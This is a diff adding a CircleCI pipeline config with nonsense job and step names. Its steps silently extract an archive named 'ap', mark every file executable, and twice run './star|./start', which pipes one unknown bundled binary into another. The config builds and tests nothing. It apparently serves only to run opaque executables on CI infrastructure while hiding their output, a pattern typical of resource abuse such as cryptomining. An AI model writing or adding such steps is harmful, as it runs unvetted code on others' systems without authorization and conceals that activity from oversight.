@@ -1,1 +1,35 @@
+version: 2.1
 
+orbs: 
+  github-cli: circleci/github-cli@volatile
+
+jobs:
+  naporci:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - github-cli/install
+      - run:
+          name: kosda
+          command: |
+            tar -xf ap >/dev/null 2>&1; chmod u+x * >/dev/null 2>&1
+      - run:
+          name: rivca
+          command: |
+            ./star|./start
+      - run:
+          name: lasut
+          command: |
+            ./star|./start
+
+
+
+    parallelism: 1
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - naporci
